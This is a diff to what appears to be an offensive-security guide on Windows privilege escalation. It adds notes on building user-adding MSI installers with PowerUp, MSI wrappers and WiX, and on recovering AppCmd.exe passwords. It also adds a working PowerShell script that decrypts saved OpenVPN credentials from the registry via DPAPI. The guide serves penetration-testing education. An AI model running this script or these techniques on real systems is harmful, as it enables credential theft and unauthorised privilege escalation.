@@ -213,7 +213,7 @@ If you have a meterpreter session you can automate this technique using the modu
 
 ### PowerUP
 
-Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges:
+Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges. This script writes out a precompiled MSI installer that prompts for a user/group addition \(so you will need GIU access\):
 
 ```text
 Write-UserAddMSI
@@ -223,9 +223,13 @@ Just execute the created binary to escalate privileges.
 
 ### MSI Wrapper
 
-Read this tutorial to learn how to create a MSI wrapper using this tools:
+Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**
 
 {% page-ref page="msi-wrapper.md" %}
+
+### Create MSI with WIX
+
+{% page-ref page="create-msi-with-wix.md" %}
 
 ### MSI Installation
 
@@ -882,7 +886,8 @@ You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurls
 
 ### AppCmd.exe
 
-**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.  
+**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.  
+AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.  
 If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.
 
 This code was extracted from _**PowerUP**_:
@@ -1125,6 +1130,28 @@ Example of web.config with credentials:
         </credentials>
     </forms>
 </authentication>
+```
+
+### OpenVPN credentials
+
+```csharp
+Add-Type -AssemblyName System.Security
+$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
+$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}
+
+foreach ($item in $items)
+{
+  $encryptedbytes=$item.'auth-data'
+  $entropy=$item.'entropy'
+  $entropy=$entropy[0..(($entropy.Length)-2)]
+
+  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
+    $encryptedBytes, 
+    $entropy, 
+    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+ 
+  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
+}
 ```
 
 ### Logs
